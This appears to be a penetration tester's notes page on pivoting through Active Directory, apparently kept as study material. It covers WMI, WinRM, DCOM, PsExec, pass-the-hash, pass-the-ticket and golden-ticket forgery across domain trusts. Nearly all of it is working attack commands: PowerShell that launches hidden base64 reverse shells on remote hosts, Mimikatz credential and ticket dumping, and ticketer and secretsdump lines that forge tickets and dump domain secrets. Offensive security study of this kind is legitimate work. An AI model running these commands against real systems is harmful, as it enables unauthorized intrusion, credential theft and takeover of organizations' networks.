---
layout: blank
pagetitle: Pivoting via Active Directory
---

Useful when we can't install something like ligolo and pivot to compromise an internal machine

## Service Pivoting

**Windows Management Instrumentation**
- Facilitates task automation via creating processes
- Uses Remote Procedure Calls (RPC) over 135 for remote access
- Abusing `wmic` (recently deprecated, but still probably good) on DMZ
	- `wmic /node:{target_IP} /user:{domain_user} /password:{password} process call create "{process}"`
	- To use with powershell, we need to turn the password into a secure string and pass a reverse shell:

```
$username = '{domain_user}';
$password = '{password}';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName {target_IP} -Credential $credential -SessionOption $Options

$Command = 'powershell -nop -w hidden -e {reverse_shell_powershell_b64}';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

**WinRM**
- Communicates over 5986 and 5985 with XML via HTTP/HTTPS
- Use with `winrs -r:{target_dnshostname} -u:{domain_user} -p:{password} "cmd /c {command}"` or `winrs -r:{target_dnshostname} -u:{domain_user} -p:{password} "powershell -nop -w hidden -e {reverse_shell_powershell_base64}"`
- Can also be done via powershell

**DCOM**
- Good for lateral movement
- Exploits the Distributed Component Object Model (DCOM)
	- Used for creating software components that interact with each other
	- Local administrator access required
- Lateral movement attacks documented by [cybereason](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)
- Performed using built-in CreateInstance
	- `$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","{target_IP}"))` 
	- `$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"{powershell -nop -w hidden -e {reverse_shell_powershell_base64}}","7")`


```
$username = '{domain_user}';
$password = '{password}';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

New-PSSession -ComputerName {target} -Credential $credential
Enter-PSSession {PSSession_ID_returned}
```

**PsExec**
- Tool used to replace telnet-like applications and provide remote execution of processes
- From [PsTools](https://download.sysinternals.com/files/PSTools.zip)
- Requires:
	- Local Administrator
	- `ADMIN$` share available (on by default)
	- File and Printer sharing (on by default)
- `./PsExec64.exe -i  \\{dnshostname} -u {domain}\{domain_user} -p {password} cmd`

**SMB**
- Domain trusts can be abused to view internal SMB shares
  - `net view //{dnshostname_or_IP} /all`

## NTLM/Kerberos Pivoting

**Overpass the Hash**
- Use an NTLM user hash to gain a full Kerberos TGT to get a TGS
- Assumes we own a server that has a domain user's hash
- This can act as `RunAs` but for a domain user's hash 
- Performed using Mimikatz
	- `sekurlsa::pth /user:{domain_user} /domain:{domain} /ntlm:{compromised_hash} /run:powershell`
- To get a Kerberos ticket, we run something in the new powershell window as jen
	- `net use \\files04`
- Once we have the ticket, we can just use PsExec to run commands on the remote systems using the compromised user
	- `PsExec.exe \\{dnshostname} powershell`
	- This only worked as the _ACTUAL_ `Administrator` local user, not just an administrative user
		- Need to be able to write to C:\Windows
		- We can just change the local Administrator user if we have an administrative user

**Pass the Ticket**
- TGTs only work on the machine they're created for, whereas TGSs offer flexibility
- Export current in-memory tickets with `sekurlsa::tickets /export`
	- This exports all tickets in `.kirbi` format in the same file directory, ls to find the ticket names (among other info)
	- We can then pick the desired ticket by passing the ticket name
		- `kerberos::ptt {ticket_name}`
	- If using these to access file shares, running something like `ls \\web04\` will just give an error. Type `ls \\web04\` and press tab (or just `Find-DomainShare` with PowerView)

**Abusing Domain Trusts**
- Golden ticket
  - If a parent domain trusts us as a child domain, we can use this to create a golden ticket with SIDs in the ticket's Privilege Attribute Certificate (PAC)
  - `ticketer.py` can use `krbtgt`'s nthash to create a golden ticket
    - `ticketer.py -nthash {child_krbtgt_nthash} -domain {child_domain} -domain-sid {child_domain_sid} -extra-sid {parent_domain_sid}-519 fakeuser`
      - To get the parent domain's sid, we can use `Get-ADDomain -Identity {domain_name}`
      - To use the ticket, we may need to save it with `export KRB5CCName={path_to_ticket}`, but I think impacket will recognize it in our directory for the specified user
    - We can then use the ticket to `secretsdump` or `psexec`
      - `secretsdump.py -k -no-pass {child_domain}/fakeuser@{parent_domain_machine_name}`
- Forging inter-realm TGT
  - We can also extract the trust key and use it to create our own trust ticket
  - `ticketer.py -nthash {child_krbtgt_nthash} -domain {child_domain} -domain-sid {child_domain_sid} -extra-sid {parent_domain_sid}-519 -spn krbtgt/{parent_domain_name} fakeuser`
    - This will again yield us a golden ticket, which we can use like before with `KRB5CCName` env var set to the path of the ticket

**Getting More Credentials**
- `vault::cred /patch` will enumerate vault credentials (creds used in scheduled tasks)